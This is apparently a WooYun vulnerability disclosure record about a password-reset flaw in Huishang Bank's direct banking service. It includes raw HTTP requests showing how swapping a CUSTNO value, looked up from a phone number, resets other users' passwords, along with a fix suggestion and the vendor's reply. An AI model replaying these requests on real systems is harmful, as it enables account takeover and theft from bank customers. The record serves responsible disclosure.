{"id": 86343, "wybug_id": "wooyun-2016-0186257", "wybug_title": "P2P金融安全之徽商银行直销银行任意账户登录", "wybug_corp": "徽商银行", "wybug_author": "咚咚呛", "wybug_date": "2016-03-20 18:20", "wybug_open_date": "2016-05-07 17:08", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["金融小能手"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-07：\t细节向公众公开  简要描述： 徽商银行直销银行-徽常有财，一种新型的银行运作模式，在我国直销银行中排名可挤如前10，此次风险影响徽商直销银行的所有账户。------请认准金融小能手 详细说明：  此风险漏洞在密码找回功能中，漏洞利用步骤如下：1、首先正常操作密码找回功能，可知其流程如下，填写手机号\n\n填写短信验证码\n\n填写新密码，风险出在此处，在填写正确密码\n\n确认后进行抓包可知如下，\n\n\nPOST /directBank/login/toSavePassword.do HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: https://**.**.**.**/directBank/login/forgetPassword.do?bankCode=3004UA-CPU: AMD64Accept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)Host: **.**.**.**Content-Length: 312Connection: Keep-AliveCache-Control: no-cacheCookie: HttpOnly=true; HttpOnly=true; JSESSIONID=65E68D475A1C6E2310768A869F2CB229.node1{\"BANKCODE\":\"3004\",\"CUSTNO\":\"30041000290461\",\"NEWPWD\":\"cjfz9JrxT3MHmnuSMN1lpoYxB5vNxC+z7NY020i2fN2EIcLI4vYX40839p0t4kQCjapM/CcnXWoHMqSJ6614C6sS0BuVbqq0p6c+QLznriAdU9/aCP3a6WPx+dNv6QTgigOLWW4icMDztShwt94ZnKm/k4COE84oiPlSIOcl+bwsSgm0j/viKLRqy+DdWRPhCkntLi/j0iwReq83IPbU+Br41z+EtJP7/YvAipyLkr8=\",\"CHANNELTYPE\":\"01\"}\n通过分析可知，修改CUSTNO的值可针对相应用户进行密码篡改，但如何知道CUSTNO所指向的是那个用户呢，在用户注册即密码找回功能中有个数据包如下，\nPOST /directBank/login/isMobileRegister.do HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: https://**.**.**.**/directBank/login/forgetPassword.do?bankCode=3004UA-CPU: AMD64Accept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)Host: **.**.**.**Content-Length: 44Connection: Keep-AliveCache-Control: no-cacheCookie: HttpOnly=true; HttpOnly=true; JSESSIONID=65E68D475A1C6E2310768A869F2CB229.node1{\"BANKCODE\":\"3004\",\"MOBILENO\":\"15910676783\"}\n\n\n通过修改指定的手机号吗即可获取相应的CUSTNO，进而对指定的手机号进行密码篡改，达到指定攻击的目的。此风险可利用为两层1、遍历CUSTNO号码进行直销行所有账户密码篡改2、通过获取指定手机号的CUSTNO值，完成对指定手机号的密码篡改。   漏洞证明：  \n\n\n\n\n\n\n\n\n\n   修复方案：  建议短信验证及最后的密码修改上做同一验证，防止绕过   版权声明：转载请注明来源 咚咚呛@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-03-23 17:08 厂商回复： CNVD未复现所述情况,已经转由CNCERT向银行业信息化主管部门通报,并抄报安徽分中心协助处置,由其后续协调网站管理单位处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-20 18:33 |    \t\tzeracker  \t\t\t( 普通白帽子  |\t\t\t        Rank:1077 漏洞数:139        | 爱吃小龙虾。)\t\t \n  铁定是通用系统啊。。。    \n     2016-03-24 09:11 |    \t\tTerry \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        )\t\t \n  果然是屹通的 居然都没做加固 做直销银行app就那几家 出了问题的基本都是一样的 之前测试还有任意账号转账什么的 一年多了这些问题还在 也是服了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}